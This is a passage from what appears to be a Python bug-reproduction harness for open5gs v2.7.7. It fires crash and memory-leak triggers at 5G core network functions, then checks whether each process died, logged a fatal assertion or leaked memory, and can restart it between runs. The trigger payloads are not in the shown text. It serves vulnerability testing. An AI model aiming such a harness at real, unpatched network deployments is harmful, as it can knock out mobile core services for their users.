        if __import__('os').path.exists(p):
            return p
    return candidates[0]   # return first candidate even if missing


_LOG_PATHS: Dict[str, str] = {nf: _find_log(nf)
                               for nf in ('nrf', 'amf', 'smf', 'udm', 'udr', 'ausf', 'pcf')}


def _restart_nf(nf_key: str, restart_cmd: str, wait: float = 5.0) -> bool:
    """Run restart_cmd and wait up to wait seconds for the NF to come back."""
    if not restart_cmd:
        return False
    logger.info('  Restarting %s: %s', nf_key, restart_cmd)
    try:
        subprocess.run(restart_cmd, shell=True, check=False,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as exc:
        logger.warning('  restart_cmd failed: %s', exc)
        return False
    deadline = time.monotonic() + wait
    while time.monotonic() < deadline:
        if _is_alive(nf_key):
            logger.info('  %s is back up', nf_key)
            return True
        time.sleep(0.5)
    logger.warning('  %s still down after %.0fs', nf_key, wait)
    return _is_alive(nf_key)


def _tail_log(nf_key: str, lines: int = 20) -> List[str]:
    path = _LOG_PATHS.get(nf_key, '')
    if not path:
        return []
    try:
        import subprocess as _sp
        out = _sp.check_output(['tail', '-n', str(lines), path],
                               stderr=_sp.DEVNULL)
        return out.decode(errors='replace').splitlines()
    except Exception:
        return []


def _run_bug(bug: Bug, cfg: Dict[str, Any]) -> str:
    """Send the trigger payload and return a result string.

    Returns one of:
      'CRASHED'          — NF process died
      'UNREACHABLE'      — NF was not running before the trigger
      'ASSERT/FATAL ...' — fatal log line detected (no crash yet)
      'LEAK +N MB'       — RSS grew beyond --rss-threshold (memory leak)
      'ALIVE'            — no anomaly detected
    """
    alive_before = _is_alive(bug.nf_key)
    rss_before   = _get_rss_mb(bug.nf_key)
    fds_before   = _get_fd_count(bug.nf_key)

    if rss_before is not None:
        logger.info('  RSS before: %.0f MB  fds=%s',
                    rss_before, fds_before if fds_before is not None else '?')

    # Snapshot byte offset so we only scan lines written AFTER this trigger.
    log_path = _LOG_PATHS.get(bug.nf_key, '')
    try:
        offset_before = os.path.getsize(log_path) if log_path and os.path.exists(log_path) else 0
    except OSError:
        offset_before = 0

    try:
        bug.trigger(cfg)
    except Exception as exc:
        logger.warning('trigger raised %s: %s', type(exc).__name__, exc)

    time.sleep(0.6)
    alive_after = _is_alive(bug.nf_key)
    rss_after   = _get_rss_mb(bug.nf_key)
    fds_after   = _get_fd_count(bug.nf_key)

    # Read only lines appended since the snapshot — avoids false positives from
    # old FATAL lines that predate this test run.
    new_lines: List[str] = []
    if log_path and os.path.exists(log_path):
        try:
            with open(log_path, 'rb') as f:
                f.seek(offset_before)
                new_content = f.read().decode(errors='replace')
                new_lines = new_content.splitlines()
        except OSError:
            pass

    crash_keywords = ('Assertion', 'assert', 'Aborted', 'segfault', 'SIGSEGV',
                      'ogs_fatal', 'Caught signal', 'core dumped', 'FATAL')
    interesting = [l for l in new_lines if any(k in l for k in crash_keywords)]

    if rss_after is not None and rss_before is not None:
        rss_delta = rss_after - rss_before
        fds_delta = (fds_after - fds_before) if (fds_after is not None and fds_before is not None) else None
        logger.info('  RSS after:  %.0f MB  Δ=+%.0f MB  fds=%s%s',
                    rss_after, rss_delta,
                    fds_after if fds_after is not None else '?',
                    f'  Δfds=+{fds_delta}' if fds_delta else '')

    if not alive_before and not alive_after:
        return 'UNREACHABLE'
    if alive_before and not alive_after:
        return 'CRASHED'
    if interesting:
        return f'ASSERT/FATAL ({interesting[0].strip()[:100]})'

    # Memory leak detection: trigger returned True and RSS grew past threshold
    rss_threshold = cfg.get('rss_threshold', 50.0)
    if rss_after is not None and rss_before is not None:
        rss_delta = rss_after - rss_before
        if rss_delta >= rss_threshold:
            return f'LEAK +{rss_delta:.0f} MB ({rss_before:.0f}→{rss_after:.0f} MB)'

    return 'ALIVE'


def main() -> int:
    parser = argparse.ArgumentParser(
        description='open5gs v2.7.7 bug reproducer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument('--bug', action='append', type=int, metavar='ISSUE',
                        help='GitHub issue number to run (repeat to run multiple; default: all)')
    parser.add_argument('--nf', action='append', metavar='NF',
                        help='Run only bugs for this NF key (udm, udr, nrf, …); '
                             'repeat to include multiple NFs')
    parser.add_argument('--restart-cmd', default='', metavar='CMD',
                        help='Shell command to restart the NF after a crash before '
                             'the next trigger (e.g. "sudo scripts/open5gs.sh restart v2.7.7"). '
                             'Waits up to 5s for the process to come back.')
    parser.add_argument('--list', action='store_true',
                        help='List available bug triggers and exit')
    parser.add_argument('--nrf',  default=NF_DEFAULTS['nrf'],  help='NRF SBI address')
    parser.add_argument('--amf',  default=NF_DEFAULTS['amf'],  help='AMF SBI address')
    parser.add_argument('--smf',  default=NF_DEFAULTS['smf'],  help='SMF SBI address')
    parser.add_argument('--udm',  default=NF_DEFAULTS['udm'],  help='UDM SBI address')
    parser.add_argument('--udr',  default=NF_DEFAULTS['udr'],  help='UDR SBI address')
    parser.add_argument('--port', default=7777, type=int,      help='SBI port (default: 7777)')
    parser.add_argument('--amf-ngap-port', default=38412, type=int,
                        help='AMF NGAP/SCTP port (default: 38412)')
    parser.add_argument('--plmn-mcc', default='999', help='PLMN MCC for NGAP (default: 999)')
    parser.add_argument('--plmn-mnc', default='70',  help='PLMN MNC for NGAP (default: 70)')
    parser.add_argument('--loop', type=int, default=200, metavar='N',
                        help='Iterations for memory-leak triggers (default: 200). '
                             'Higher counts (e.g. 1000) make the leak more visible.')
    parser.add_argument('--loop-interval', type=float, default=0.0, metavar='S',
                        help='Sleep seconds between iterations in leak triggers (default: 0). '
                             'Use 0.05-0.1 to slow down and observe RSS step-by-step.')
    parser.add_argument('--rss-threshold', type=float, default=50.0, metavar='MB',
                        help='RSS growth in MB to report as LEAK (default: 50). '
                             'Set lower (e.g. 20) for earlier detection in short runs.')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Print request/response details')
    args = parser.parse_args()

    if args.list:
        print(f'{"Issue":>7}  {"Component":<18}  Description')
        print('-' * 80)
        for b in BUGS:
            issue_str = f'#{b.issue}' if b.issue else '(new)'
            print(f'{issue_str:>7}  {b.component:<18}  {b.title}')
            print(f'         {"":18}  {b.notes}')
        return 0

    cfg: Dict[str, Any] = {
        'nrf':           args.nrf,
        'amf':           args.amf,
        'smf':           args.smf,
        'udm':           args.udm,
        'udr':           args.udr,
        'port':          args.port,
        'amf_ngap_port': args.amf_ngap_port,
        'plmn_mcc':      args.plmn_mcc,
        'plmn_mnc':      args.plmn_mnc,
        'verbose':       args.verbose,
        'loop':          args.loop,
        'loop_interval': args.loop_interval,
        'rss_threshold': args.rss_threshold,
        'restart_cmd':   args.restart_cmd,
    }

    nf_filter  = [n.lower() for n in args.nf] if args.nf else []
    targets = [
        b for b in BUGS
        if (not args.bug or b.issue in args.bug)
        and (not nf_filter or b.nf_key in nf_filter)
    ]
    if not targets:
        print(f'No bugs matched: bug={args.bug} nf={args.nf}')
        return 1

    print(f'\nopen5gs v2.7.7 bug reproducer — {len(targets)} trigger(s)')
    print(f'NRF={args.nrf}  AMF={args.amf}  UDM={args.udm}  UDR={args.udr}  port={args.port}')
    print('=' * 72)

    restart_cmd = cfg.get('restart_cmd', '')
    crashed = []
    prev_nf_key = None
    for bug in targets:
        # Restart crashed NF before next trigger if restart_cmd is set
        if prev_nf_key and restart_cmd and not _is_alive(prev_nf_key):
            _restart_nf(prev_nf_key, restart_cmd)
        prev_nf_key = bug.nf_key

        issue_label = f'#{bug.issue}' if bug.issue else 'new'
        print(f'\n[{issue_label}] {bug.title}')
        print(f'  Component : {bug.component}')
        print(f'  Notes     : {bug.notes}')

        result = _run_bug(bug, cfg)

        if result == 'CRASHED':
            print(f'  Result    : *** CRASHED — {bug.component} process died ***')
            crashed.append(bug.issue)
        elif result == 'UNREACHABLE':
            print(f'  Result    : UNREACHABLE — {bug.component} not running')
            if restart_cmd:
                print(f'              (hint: NF may be down from previous trigger; '
                      f'pass --restart-cmd to auto-restart between bugs)')
        elif result.startswith('ASSERT/FATAL'):
            print(f'  Result    : *** {result} ***')
            crashed.append(bug.issue)
        elif result.startswith('LEAK'):
            print(f'  Result    : *** MEMORY LEAK — {result} ***')
            print(f'              Reproduce: run with --loop 1000 and watch RSS')
            print(f'              Check:     /proc/$(pgrep -x {_PROC_NAMES.get(bug.nf_key,"?")})/status')
            crashed.append(bug.issue)
        else:
            print(f'  Result    : alive — check {_LOG_PATHS.get(bug.nf_key, "NF log")} for assertions')

    print('\n' + '=' * 72)
    if crashed:
        print(f'CONFIRMED CRASHES: {crashed}')
    else:
        print('No crashes confirmed (NF may not be running, or already patched)')
    return 0 if crashed else 1


if __name__ == '__main__':
    sys.exit(main())
